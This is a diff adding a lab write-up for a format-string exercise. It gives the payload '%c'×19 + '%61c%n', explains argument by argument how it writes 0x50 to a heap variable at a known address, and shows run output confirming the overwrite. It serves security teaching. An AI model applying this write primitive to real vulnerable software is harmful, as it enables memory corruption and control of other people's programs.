@@ -1,0 +1,32 @@
+Task 5.4 Summary
+================
+
+Goal:
+Modify `secret[1]` to the predetermined value `0x50` (80 decimal).
+
+Known runtime address:
+- `secret[1] = 0x40804044`
+- Decimal form used for `int_input` = `1082146884`
+
+Input used:
+$ sed -n '1,10p' ../task04_input.txt
+1082146884
+%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%61c%n
+
+How it works:
+- The first 19 `%c` conversions print 19 characters while consuming stack arguments 1 through 19.
+- `%61c` consumes stack argument 20 and prints a field of width 61, so the cumulative printed count becomes `19 + 61 = 80`.
+- `%n` then uses stack argument 21, which is `int_input = 0x40804044`.
+- Therefore `printf` writes `80` decimal (`0x50`) into `secret[1]`.
+
+Observed result:
+$ sed -n '1,20p' task04_run.txt
+The variable secret's address is 0x40800d38 (on stack)
+The variable secret's value is 0x40804040 (on heap)
+secret[0]'s address is 0x40804040 (on heap)
+secret[1]'s address is 0x40804044 (on heap)
+Please enter a decimal integer
+Please enter a string
+<binary-looking printable output omitted>
+The original secrets: 0x44 -- 0x55
+The new secrets: 0x44 -- 0x50
